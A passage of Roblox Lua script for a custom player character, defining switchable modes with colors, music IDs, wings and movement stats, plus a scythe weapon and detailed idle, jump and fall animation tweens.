		v.main.PointLight.Color = RLC
		v.main.Attachment.ParticleEmitter.Color = ColorSequence.new(MainRWingColor)
		v.main.PE.ParticleEmitter.Color = ColorSequence.new(MainRWingColor)
	end
end

--SCYTHE

function AFrame(one,two,three,four,five,six)
	return(CFrame.new(one,two,three)*CFrame.fromEulerAnglesXYZ(rad(four),rad(five),rad(six)))
end

scythe = resources.Scythe:Clone()
scythe.Parent = char
scWeld = Instance.new("Motor6D")
scWeld.Part0 = scythe.Black
scWeld.Part1 = rarm
scWeld.C0 = AFrame(-1.04,0.53,-0.21,85.6,-6.5,89.5)
scWeld.Parent = rarm
scActive = true

wepV = script.WeaponOut

function manageScy()
	if (Side == 1 and Mode == "g") then
		for i, v in pairs(scythe:GetChildren()) do
			v.Transparency = 0
		end
		scActive = true
		wepV.Value = "Scythe"
	elseif scActive then
		for i, v in pairs(scythe:GetChildren()) do
			v.Transparency = 1
		end
		scActive = false
		wepV.Value = ""
	end
end

--MODE STUFF

function HumStats(WalkSpeed,JumpPower)
	StoredHumWalkSpeed = WalkSpeed
	Hum.WalkSpeed = WalkSpeed
	StoredHumJumpPower = JumpPower
	Hum.JumpPower = JumpPower
end

local Modes = {
	["q"] = {RName="SERESUTE",HName="ã»ã¬ã·ã¥ã¼ã",Theme={ID="5711318595",Name="???"},IAnim=1,WAnim=1,
	Colors={rgb(0,45,100),rgb(60,86,170),rgb(108,164,176)},Wings={Left=3,Right=3},
	Stats={WS=16,JP=50},WingC={2,1,3,3,2,1,3,3}},

	["qm"] = {RName="CHÅSHINSEI",HName="è¶æ°æ",Theme={ID="5725319056",Name="???"},IAnim="Snova",WAnim=1,
	Colors={rgb(129, 232, 255),rgb(79, 83, 80),rgb(212, 193, 123)},Wings={Left=3,Right=3},
	Stats={WS=450,JP=50},WingC={2,1,3,3,2,1,3,3}},

	["e"] = {RName="SUTARAITO",HName="ã¹ã¿ã¼ã©ã¤ã",Theme={ID="4746484927",Name="xi - Fiat Lux"},IAnim=5,WAnim="David",
	Colors={rgb(111, 255, 202),rgb(166, 255, 128),rgb(0, 255, 255),rgb(248, 248, 248)},Wings={Left=3,Right=3},
	Stats={WS=48,JP=60},WingC={2,1,3,4,2,1,3,4}},

	["r"] = {RName="FUHAI",HName="èæ",Theme={ID="4504762086",Name="Camellia - Circles of Death",Pitch=0.985},IAnim=4,WAnim="ActualWings",
	Colors={rgb(77, 20, 93),rgb(255, 93, 131),rgb(61, 21, 133),rgb(0,0,0)},Wings={Left=3,Right=3},
	Stats={WS=32,JP=40},WingC={2,1,3,4,2,1,3,4}},

	["t"] = {RName="REBORYÅªSHON",HName="ã¬ããªã¥ã¼ã·ã§ã³",Theme={ID="5711768816",Name="???"},IAnim=3,WAnim=1,
	Colors={rgb(170, 74, 76),rgb(86, 0, 1),rgb(184, 66, 84)},Wings={Left=4,Right=4},
	Stats={WS=20,JP=60},WingC={1,2,3,3,1,2,3,3}},

	["tm"] = {RName="FUKUSHÅªNIMOERU",HName="å¾©è®ã«çãã",Theme={ID="5708366755",Name="xi - Failnaught",Pitch=1},IAnim="Requisite",WAnim="ActualWings",
	Colors={rgb(255, 123, 125),rgb(88, 0, 1),rgb(184, 0, 0),rgb(184, 0, 0)},Wings={Left=3,Right=3},
	Stats={WS=32,JP=40},WingC={2,1,3,4,2,1,3,4}},

	["y"] = {RName="SHINJITSU",HName="ä¿¡å®",Theme={ID="5711768816",Name="???"},IAnim=3,WAnim=1,
	Colors={rgb(255, 255, 255),rgb(91, 85, 255),rgb(80, 70, 255)},Wings={Left=4,Right=4},
	Stats={WS=20,JP=60},WingC={1,2,3,3,1,2,3,3}},

	["yn"] = {RName="CHIRYOKU",HName="ç¥å",Theme={ID="5711768816",Name="???"},IAnim=3,WAnim=1,
	Colors={rgb(99, 248, 243),rgb(0, 0, 0),rgb(75, 200, 255)},Wings={Left=4,Right=4},
	Stats={WS=20,JP=60},WingC={2,1,3,2,2,1,3,2}},

	["u"] = {RName="KOKORONOKOMOTTA",HName="å¿ã®ããã£ã",Theme={ID="5712004125",Name="???",Pitch=1},IAnim="Love",WAnim=1,
	Colors={rgb(35, 14, 57),rgb(127, 96, 170),rgb(153, 94, 176)},Wings={Left=3,Right=3},
	Stats={WS=24,JP=70},WingC={1,2,3,3,1,2,3,3}},

	["um"] = {RName="YUMEOMIRUKOTO",HName="å¤¢ãè¦ããã¨",Theme={ID="5573839582",Name="???",Pitch=1},IAnim="Love",WAnim="ButterflySlow",Lighting="Dream",
	Colors={rgb(127, 119, 207),rgb(103, 157, 165),rgb(212, 144, 189)},Wings={Left=3,Right=3},
	Stats={WS=8,JP=40},WingC={1,2,3,3,1,2,3,3}},

	["f"] = {RName="JIKANNONAKANOKÅªKAN",HName="æéã®ä¸­ã®ç©ºé",Theme={ID="4842973011",Name="???"},IAnim="SpaceOrSomething",WAnim="Sun",Aura=1,
	Colors={rgb(92, 86, 181),rgb(41, 35, 56),rgb(72, 81, 253)},Wings={Left=8,Right=6},
	Stats={WS=116,JP=75},WingC={1,2,3,3,1,2,3,3}},

	["g"] = {RName="SHINIGAMI",HName="æ­»ç¥",Theme={ID="5729575160",Name="[SDVX] Laur - A Lasting Promise [NOFX]"},IAnim=6,WAnim=1,
	Colors={rgb(0, 0, 0),rgb(255, 255, 255),rgb(255, 0, 0)},Wings={Left=3,Right=3},
	Stats={WS=16,JP=50},WingC={2,1,3,3,2,1,3,3}},

	["h"] = {RName="AKINOOTOZURE",HName="ç§ã®è¨ªã",Theme={ID="5121455781",Name="???"},IAnim="Autumn",WAnim="Autumn",Aura="Autumn",
	Colors={rgb(188, 155, 93),rgb(255, 93, 0),rgb(255, 255, 255)},TagColor1=rgb(255, 255, 255),TagColor2=rgb(255, 93, 0),Wings={Left=6,Right=6},
	Stats={WS=75,JP=50},WingC={1,2,3,2,1,2,3,2}},

	["j"] = {RName="KAKUMEI",HName="é©å½",Theme={ID="3089991101",Name="Frums - Credits Extended"},IAnim="Revolve",WAnim="SpinningCore",
	Colors={rgb(255, 0, 0),rgb(187, 0, 0),rgb(0, 0, 0)},Wings={Left=5,Right=5},
	Stats={WS=10,JP=30},WingC={1,2,3,2,1,2,3,2}},

	["k"] = {RName="KURAYAMINIMAYÅ",HName="æéã«è¿·ã",Theme={ID="2995322946",Name="???"},IAnim="Lost",WAnim="Wacky1",Aura="Lost",Lighting="Brazil",
	Colors={rgb(189, 128, 97),rgb(0, 0, 0),rgb(188, 96, 73)},Wings={Left=4,Right=4},
	Stats={WS=25,JP=50},WingC={1,2,3,2,1,2,3,2}},
}

function getMode(mode)
	--Mode = mode
	C1,C2,C3,C4 = mode["Colors"][1],mode["Colors"][2], mode["Colors"][3] or mode["Colors"][1],mode["Colors"][4] or mode["Colors"][3] or mode["Colors"][2]
	TagChange(mode["HName"],mode["RName"],(mode["TagColor1"] or C1),(mode["TagColor2"] or C2))
	NewSong(mode["Theme"]["ID"],1.5,0,mode["Theme"]["Pitch"] or 1.015) 
	showWings(mode["Wings"]["Left"] or 3,mode["Wings"]["Right"] or 3)
	local sT = {}
	for i, v in pairs(mode["WingC"]) do
		sT[i] = mode["Colors"][v]
	end
	Recolor(sT[1],sT[2],sT[3],sT[4],sT[5],sT[6],sT[7],sT[8])
	HumStats(mode["Stats"]["WS"] or 32,mode["Stats"]["JP"] or 50)
	WAnimV.Value = mode["WAnim"]
	IdleAnim = mode["IAnim"]
	aura = (mode["Aura"] or 0)
	script.Arua.Value = aura
	color3values[1].Value = C1 color3values[2].Value = C2 color3values[3].Value = C3 color3values[4].Value = C4
	local Lighting = (mode["Lighting"] or "E")
	LightingMain.ChangeLighting:FireClient(Player,Lighting)
	manageScy()
end

--local CurrentKey = "q" --I don't think this needs to exist
mouse.KeyDown:connect(function(k) 
	if Modes[Mode..k] then -- majors
		Mode = Mode..k
		--CurrentKey = CurrentKey..k
		getMode(Modes[Mode])
	elseif Modes[k] then -- base modes
		Mode = k
		--CurrentKey = k
		getMode(Modes[k])
	end
end)

mouse.Button1Down:connect(function()
	local pos = CFrame.new(mouse.Hit.Position)*cf(0,25,0)
	Sound("CFrameSound",3748209965,char,8,1,0,CFrame.new(mouse.Hit.Position)*cf(0,25,0))
	Sound("CFrameSound",3744393124,char,4,1,0,CFrame.new(mouse.Hit.Position)*cf(0,25,0))
	for i=0,math.random(2,3) do
		local radnum = math.random(0,360)
		EpicEffect(swait,{
			Life=35,
			Type="Tornado",
			Size1=Vector3.new(0,50,0),
			Size2=Vector3.new(50,50,50),
			Transparency1=0,
			Transparency2=1,
			Color1=C1,
			Color2=C2,
			UpdateColors=true,
			Pos1=pos*CFrame.Angles(0,math.rad(radnum),0),
			RotationY=math.random(14,16),
		},C1,C2,C3,C4)
	end
	
end)

getMode(Modes["q"])

workspace.Whatever:FireAllClients("animsandstuff",wings,script.WAnim,script.WeaponOut,char)
workspace.Whatever:FireAllClients("FunniAruas",char,script.Arua)
-- FInal Lop

local Anim="Idle"

while true do
	swait()
	--Footplanting code, no need to modify anything, variable is Vec.X,Y or Z
	local Walking = Hum.MoveDirection.magnitude>0
	local FwdDir = (Walking and Hum.MoveDirection*root.CFrame.lookVector or Vector3.new())
	local RigDir = (Walking and Hum.MoveDirection*root.CFrame.rightVector or Vector3.new())
	local Vec = {
		X=RigDir.X+RigDir.Z,
		Z=FwdDir.X+FwdDir.Z
	};
	local Divide = 1
	if(Vec.Z<0)then
		Divide=math.clamp(-(1.25*Vec.Z),1,2)
	end
	Vec.Z = Vec.Z/Divide
	Vec.X = Vec.X/Divide
	local torvel=(RootPart.Velocity*Vector3.new(1,0,1)).magnitude
	local velderp=RootPart.Velocity.y
	hitfloor,posfloor=rayCast(RootPart.Position,(CFrame.new(RootPart.Position,RootPart.Position - Vector3.new(0,1,0))).lookVector,4,char)
	if RootPart.Velocity.y > 1 and hitfloor==nil then
		Anim="Jump"
		local Sine,Alpha,Easing,Direction,Repeat,Reverse,Delay = sin(sine/32),4/60,'Sine','InOut',0,false,0
		RTweenAnimate(RH,{C0=cf(1,-.4,-.5)*rang(0,90)*rang(0,0,-15)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(LH,{C0=cf(-1,-1,0)*rang(0,-90)*rang(0,0,15)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(RootJoint,{C0=RootCF*cf(0,0,0)*rang(-15,0,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(Torso.Neck,{C0=necko*rang(-35,0,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(RW,{C0=cf(1.5,0.5,.4)*rang(-25,-20,20)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(LW,{C0=cf(-1.5,0.5,.4)*rang(-25,20,-20)},Alpha,Easing,Direction,Repeat,Reverse,Delay)

	elseif RootPart.Velocity.y < -1 and hitfloor==nil then 
		Anim="Fall"
		local Sine,Alpha,Easing,Direction,Repeat,Reverse,Delay = sin(sine/32),4/60,'Sine','InOut',0,false,0
		RTweenAnimate(RH,{C0=cf(1,-.4,-.5)*rang(0,90)*rang(0,0,-15)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(LH,{C0=cf(-1,-1,0)*rang(0,-90)*rang(0,0,15)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(RootJoint,{C0=RootCF},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(Torso.Neck,{C0=necko*rang(20,0,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(RW,{C0=cf(1,0.9,0)*rang(0,-10,95 - 10 * math.cos(sine/24))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(LW,{C0=cf(-1,0.9,0)*rang(0,10,-95 + 10 * math.cos(sine/24))},Alpha,Easing,Direction,Repeat,Reverse,Delay)

	elseif torvel<2 and hitfloor~=nil then
		Anim="Idle"
		if IdleAnim == 1 then
			local Sine,Alpha,Easing,Direction,Repeat,Reverse,Delay = sin(sine/32),0.15,'Linear','Out',0,false,0
			local eg = RTweenAnimate(RootJoint,{C0=cf(0+0*Sine,1.8+-0.2*Sine,0.1+0*Sine)*rang(6.8+-0.4*Sine,-17.9+0*Sine,2.1+0*Sine)*RootCF},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(LH,{C0=cf(-1+0*Sine,-0.4+0*Sine,0+0*Sine)*rang(-10.5+0.3*Sine,23+0.1*Sine,3+-1.2*Sine)*rang(0,-90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RH,{C0=cf(1+0*Sine,-1+0*Sine,-0.1+0.1*Sine)*rang(-8.9+1.6*Sine,0+0*Sine,0+0*Sine)*rang(0,90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			Sine = cos(sine/32)
			RTweenAnimate(LW,{C0=cf(-1.1+0*Sine,0.4+0*Sine,0.5+0*Sine)*rang(-29.6+-6.2*Sine,-14.2+-1.4*Sine,28.5+2.5*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RW,{C0=cf(1.1+0*Sine,0.4+0*Sine,0.5+0*Sine)*rang(-25.6+-4.9*Sine,10+0.8*Sine,-32.6+-0.4*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(char.Torso.Neck,{C0=necko*rang(26.8+3.7*Sine,0+-3*Sine,33.5+1.3*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		elseif IdleAnim == "Revolve" then
			local Sine,Alpha,Easing,Direction,Repeat,Reverse,Delay = sin(sine/32),0.15,'Linear','Out',0,false,0
			if math.random(1,30) == 20 then
				local eg = RTweenAnimate(RootJoint,{C0=cf(0+0*Sine,-0.1+0*Sine,-0.1+0*Sine)*rang(-14.5+-2.7*Sine,-29.2+0*Sine,-7.2+0*Sine)*RootCF},Alpha,Easing,Direction,Repeat,Reverse,Delay)
				RTweenAnimate(LH,{C0=cf(-1.1+0*Sine,-0.9+0*Sine,0+0*Sine)*rang(12.9+2.4*Sine,30+0*Sine,-0.1+1.4*Sine)*rang(0,-90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
				RTweenAnimate(RH,{C0=cf(1+0*Sine,-1.1+0*Sine,-0.3+0*Sine)*rang(-30.8+-0.9*Sine,0+0*Sine,0+0*Sine)*rang(0,90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
				Sine = cos(sine/32)
				RTweenAnimate(LW,{C0=cf(-1.4+0*Sine,0+0.1*Sine,0+0*Sine)*rang(10.1+2.6*Sine,19.8+0.1*Sine,-2.7+-0.9*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
				RTweenAnimate(RW,{C0=cf(0.9+-0.1*Sine,0.7+0*Sine,-0.6+-0.1*Sine)*rang(157.2+0.3*Sine,-18+1.2*Sine,-27.5+-1*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
				RTweenAnimate(char.Torso.Neck,{C0=necko*rang(26.8+math.random(-5,5),0+math.random(-5,5),33.5+math.random(-5,5))},0.04,Easing,Direction,Repeat,Reverse,Delay)
			else
				local eg = RTweenAnimate(RootJoint,{C0=cf(0+0*Sine,-0.1+0*Sine,-0.1+0*Sine)*rang(-14.5+-2.7*Sine,-29.2+0*Sine,-7.2+0*Sine)*RootCF},Alpha,Easing,Direction,Repeat,Reverse,Delay)
				RTweenAnimate(LH,{C0=cf(-1.1+0*Sine,-0.9+0*Sine,0+0*Sine)*rang(12.9+2.4*Sine,30+0*Sine,-0.1+1.4*Sine)*rang(0,-90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
				RTweenAnimate(RH,{C0=cf(1+0*Sine,-1.1+0*Sine,-0.3+0*Sine)*rang(-30.8+-0.9*Sine,0+0*Sine,0+0*Sine)*rang(0,90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
				Sine = cos(sine/32)
				RTweenAnimate(LW,{C0=cf(-1.4+0*Sine,0+0.1*Sine,0+0*Sine)*rang(10.1+2.6*Sine,19.8+0.1*Sine,-2.7+-0.9*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
				RTweenAnimate(RW,{C0=cf(0.9+-0.1*Sine,0.7+0*Sine,-0.6+-0.1*Sine)*rang(157.2+0.3*Sine,-18+1.2*Sine,-27.5+-1*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
				RTweenAnimate(char.Torso.Neck,{C0=necko*rang(5.5, -21.4, 30)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			end
		elseif IdleAnim == 3 then
			local Sine,Alpha,Easing,Direction,Repeat,Reverse,Delay = sin(sine/32),0.15,'Linear','Out',0,false,0
			local eg = RTweenAnimate(RootJoint,{C0=cf(0.2+0*Sine,5.5+0.5*Sine,0.2+0*Sine)*rang(32.2+5*Sine,39+0*Sine,-25.8+0*Sine)*RootCF},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(LH,{C0=cf(-1+0*Sine,-0.2+-0.1*Sine,-0.7+-0.1*Sine)*rang(-27.5+-12.5*Sine,0+0*Sine,0+0*Sine)*rang(0,-90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RH,{C0=cf(1+0*Sine,-1+0*Sine,-0.1+0*Sine)*rang(-27.5+-12.5*Sine,0+0*Sine,0+0*Sine)*rang(0,90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			Sine = cos(sine/32)
			RTweenAnimate(LW,{C0=cf(-1.3+0*Sine,0.5+0*Sine,0.3+0*Sine)*rang(-10+-4.5*Sine,0+2.1*Sine,22.5+-2.4*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RW,{C0=cf(1.6+0*Sine,0.3+0*Sine,0.2+0*Sine)*rang(-21.2+-4.5*Sine,-12.9+1.9*Sine,31.5+8.7*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(char.Torso.Neck,{C0=necko*rang(24.6+6.5*Sine,-0.7+-2.7*Sine,-33.8+-6.8*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		elseif IdleAnim == "Autumn" then
			local Alpha,Easing,Direction,Repeat,Reverse,Delay = 0.15,'Linear','Out',0,false,0
			RTweenAnimate(RH,{C0=cf(1+0*math.cos(sine/32),-1+0*math.cos(sine/32),0+0*math.cos(sine/32))*angles(math.rad(-25+-5*math.cos(sine/85)),math.rad(90+2*math.cos(sine/97)),math.rad(0+2*math.cos(sine/76)))*angles(math.rad(5),0,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(LH,{C0=cf(-0.75+0*math.cos(sine/32),-0.25+0*math.cos(sine/32),-0.75+0*math.cos(sine/32))*angles(math.rad(-45+-5*math.cos(sine/85)),math.rad(-90+2*math.cos(sine/81)),math.rad(0+2*math.cos(sine/82)))*angles(math.rad(-15),0,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RootJoint,{C0=RootCF*cf(0+0.2*math.cos(sine/67),0+0.2*math.cos(sine/72),3+1.5*math.cos(sine/85))*angles(math.rad(-6+-5*math.cos(sine/85)),math.rad(0+0*math.cos(sine/32)),math.rad(56+0*math.cos(sine/32)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(Torso.Neck,{C0=necko*cf(0+0*math.cos(sine/32),0+0*math.cos(sine/32),0+0*math.cos(sine/32))*angles(math.rad(0+-5*math.cos(sine/85)),math.rad(-5+-5*math.cos(sine/85)),math.rad(-56+0*math.cos(sine/32)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RW,{C0=cf(1.2+0*math.cos(sine/32),0.4+0.1*math.cos(sine/85),0.25+0*math.cos(sine/32))*angles(math.rad(-45+0*math.cos(sine/32)),math.rad(-26+0*math.cos(sine/32)),math.rad(-45+0*math.cos(sine/32)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(LW,{C0=cf(-1.5+0*math.cos(sine/32),0.6+0.1*math.cos(sine/85),0+0*math.cos(sine/32))*angles(math.rad(0+0*math.cos(sine/32)),math.rad(0+0*math.cos(sine/32)),math.rad(-26+10*math.cos(sine/85)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		elseif IdleAnim == "SpaceOrSomething" then
			local Alpha,Easing,Direction,Repeat,Reverse,Delay = .15,'Linear','Out',0,false,0
			RTweenAnimate(RH,{C0=cf(1+0*math.cos(sine/32),-1+0*math.cos(sine/32),0+0*math.cos(sine/32))*angles(math.rad(-33+-9*math.cos(sine/32)),math.rad(90+5*math.cos(sine/94)),0)*angles(math.rad(-9+2*math.cos(sine/32)),0,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(LH,{C0=cf(-1+0*math.cos(sine/32),-1+0*math.cos(sine/32),0+0*math.cos(sine/32))*angles(math.rad(-25+-7*math.cos(sine/32)),math.rad(-90+5*math.cos(sine/85)),0)*angles(math.rad(5+1*math.cos(sine/32)),0,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RootJoint,{C0=RootCF*cf(0+0.25*math.cos(sine/72),0+0.25*math.cos(sine/86),2.5+1.5*math.cos(sine/32))*angles(math.rad(-15+-8*math.cos(sine/32)),math.rad(0+0*math.cos(sine/32)),math.rad(-36+0*math.cos(sine/32)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(Torso.Neck,{C0=necko*cf(0+0*math.cos(sine/32),0+0*math.cos(sine/32),0+0*math.cos(sine/32))*angles(math.rad(16+5*math.cos(sine/32)),math.rad(0+0*math.cos(sine/32)),math.rad(36+0*math.cos(sine/32)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RW,{C0=cf(1.5+0*math.cos(sine/32),0.65+0.1*math.cos(sine/32),0+0*math.cos(sine/32))*angles(math.rad(-15+5*math.cos(sine/89)),math.rad(-10+5*math.cos(sine/69)),math.rad(35+-5*math.cos(sine/32)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(LW,{C0=cf(-1.25+0*math.cos(sine/32),0.3+0.1*math.cos(sine/32),-0.5+0*math.cos(sine/32))*angles(math.rad(76+5*math.cos(sine/76)),math.rad(25+5*math.cos(sine/32)),math.rad(56+8*math.cos(sine/91)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		elseif IdleAnim == 4 then
			local Sine,Alpha,Easing,Direction,Repeat,Reverse,Delay = sin(sine/32),10/60,'Sine','Out',0,false,0
			local eg = RTweenAnimate(RootJoint,{C0=cf(-0.1+-0.35*sin(sine/60),1.7+-0.65*Sine,-0.1+0.35*sin(sine/68))*rang(-6.6+4*sin(sine/60),-32.1+-2*Sine,11.4+4*sin(sine/68))*RootCF},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(LH,{C0=cf(-1.6+0*Sine,-0.3+0.1*Sine,-0.7+0.1*Sine)*rang(-40.2+7.4*Sine,39.9+0*Sine,12.9+1*Sine)*rang(0,-90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RH,{C0=cf(1.1+0*Sine,-1.2+-0.1*Sine,-0.1+0*Sine)*rang(-18.3+3.9*Sine,-3.4+0.6*Sine,-9.1+-3*Sine)*rang(0,90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			Sine = cos(sine/32)
			RTweenAnimate(LW,{C0=cf(-0.5+0*Sine,0.4+0.1*Sine,-0.7+0*Sine)*rang(143.3+-2.5*Sine,13.9+0*Sine,71.6+0*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RW,{C0=cf(1.5+0*Sine,0.4+0*Sine,0.3+0*Sine)*rang(-19.8+0.1*Sine,-19.9+0.1*Sine,36.3+-7.5*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(char.Torso.Neck,{C0=necko*rang(27.6+-2.7*Sine,3.3+2.1*Sine,40.6+6.7*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		elseif IdleAnim == 5 then
			local Sine,Alpha,Easing,Direction,Repeat,Reverse,Delay = sin(sine/32),10/60,'Sine','Out',0,false,0
			local eg = RTweenAnimate(RootJoint,{C0=cf(0.1+-0.35*sin(sine/60),2+-0.65*Sine,0+0.35*sin(sine/68))*rang(9.9+-6.2*sin(sine/60),28.7+-0.3*Sine,-8.7+-4*sin(sine/68))*RootCF},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(LH,{C0=cf(-0.9+0*Sine,-1+-0.1*Sine,-0.2+0*Sine)*rang(-16.2+3.2*Sine,19.2+0.8*Sine,-13.3+3.8*Sine)*rang(0,-90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RH,{C0=cf(1.1+0*Sine,-0.4+0*Sine,-1.2+0*Sine)*rang(-36.8+6.2*Sine,-16.5+-3.5*Sine,7.8+3.6*Sine)*rang(0,90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			Sine = cos(sine/32)
			RTweenAnimate(LW,{C0=cf(-1.6+0*Sine,1.5+-0.1*Sine,-0.3+-0.1*Sine)*rang(-179.7+4.7*Sine,14.1+-1.1*Sine,4+-1.2*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RW,{C0=cf(1.6+0*Sine,0.7+0.1*Sine,0.3+0*Sine)*rang(-23+-2.2*Sine,-20.7+-1*Sine,37.8+7.1*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(char.Torso.Neck,{C0=necko*rang(30.5+3.6*Sine,1+-0.8*Sine,-28.3+-1.5*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		elseif IdleAnim == 6 then
			local Sine,Alpha,Easing,Direction,Repeat,Reverse,Delay = sin(sine/32),10/60,'Sine','Out',0,false,0
			local eg = RTweenAnimate(RootJoint,{C0=cf(0.1+0*Sine,2.9+-0.5*Sine,0.2+0.1*Sine)*rang(17.2+0*Sine,28.9+0*Sine,-8.5+0*Sine)*RootCF},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(LH,{C0=cf(-1+0*Sine,-0.9+0*Sine,-0.1+0*Sine)*rang(-19.9+5*Sine,1.3+0*Sine,-4.8+0*Sine)*rang(0,-90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RH,{C0=cf(1+0*Sine,-0.5+-0.1*Sine,-1+0.1*Sine)*rang(-20+5*Sine,0.4+0*Sine,5+0*Sine)*rang(0,90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			Sine = cos(sine/32)
			RTweenAnimate(LW,{C0=cf(-0.7+0*Sine,0.6+0*Sine,-1+-0.1*Sine)*rang(93.3+10*Sine,20.5+2.5*Sine,81+0.2*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RW,{C0=cf(1.6+0*Sine,0.8+0.1*Sine,-0.1+0*Sine)*rang(-8.7+0*Sine,12.2+0*Sine,43.4+7.5*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(char.Torso.Neck,{C0=necko*rang(5.8, 2.1, -29.9)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		elseif IdleAnim == "Lost" then
			local Alpha,Easing,Direction,Repeat,Reverse,Delay = .15,'Linear','Out',0,false,0
			RTweenAnimate(RH,{C0=cf(1+0*math.cos(sine/32),-0.8+0.1*math.cos(sine/69),-0.8+-0.1*math.cos(sine/69))*angles(math.rad(-35+15*math.cos(sine/69)),math.rad(90+2*math.cos(sine/77)),0)*angles(math.rad(0+2*math.cos(sine/97)),0,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(LH,{C0=cf(-1+0*math.cos(sine/32),0+0.05*math.cos(sine/69),-0.5+0*math.cos(sine/32))*angles(math.rad(25+10*math.cos(sine/69)),math.rad(-90+2*math.cos(sine/84)),0)*angles(math.rad(-2+2*math.cos(sine/94)),0,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RootJoint,{C0=RootCF*cf(0+0*math.cos(sine/32),0+0*math.cos(sine/32),-0.9+0.1*math.cos(sine/69))*angles(math.rad(45+10*math.cos(sine/69)),math.rad(0+0*math.cos(sine/32)),math.rad(0+0*math.cos(sine/32)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(Torso.Neck,{C0=necko*cf(0+0*math.cos(sine/32),0+0*math.cos(sine/32),0+0*math.cos(sine/32))*angles(math.rad(35+-3*math.cos(sine/69)),math.rad(0+0*math.cos(sine/32)),math.rad(0+0*math.cos(sine/32)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(RW,{C0=cf(1.5+0*math.cos(sine/32),0.5+0.1*math.cos(sine/69),0+0*math.cos(sine/32))*angles(math.rad(120+2*math.cos(sine/85)),math.rad(-14+2*math.cos(sine/54)),math.rad(-50+2*math.cos(sine/91)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
			RTweenAnimate(LW,{C0=cf(-1.5+0*math.cos(sine/32),0.5+0.1*math.cos(sine/69),0+0*math.cos(sine/32))*angles(math.rad(120+2*math.cos(sine/66)),math.rad(18+2*math.cos(sine/76)),math.rad(50+2*math.cos(sine/84)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
	   
      elseif IdleAnim == "Requisite" then
	   local Sine,Alpha,Easing,Direction,Repeat,Reverse,Delay = sin(sine/32),.15,'Linear','Out',0,false,0
